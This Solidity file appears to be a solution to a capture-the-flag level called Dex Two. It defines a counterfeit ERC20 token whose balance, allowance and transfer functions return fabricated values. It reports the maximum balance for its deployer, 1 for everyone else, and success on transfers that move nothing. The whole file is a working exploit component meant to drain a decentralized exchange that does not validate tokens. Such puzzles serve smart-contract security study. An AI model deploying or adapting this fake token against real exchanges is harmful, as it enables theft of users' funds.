// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract DexTwoSolution {
    address owner;

    constructor() {
        owner = msg.sender;
    }

    function totalSupply() external pure returns (uint256) {
        return 115792089237316195423570985008687907853269984665640564039457584007913129639935;
    }

    function balanceOf(address account) external view returns (uint256) {
        if (account == owner) {
            return 115792089237316195423570985008687907853269984665640564039457584007913129639935;
        }
        return 1;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function allowance(address, address) external pure returns (uint256) {
        return 115792089237316195423570985008687907853269984665640564039457584007913129639935;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}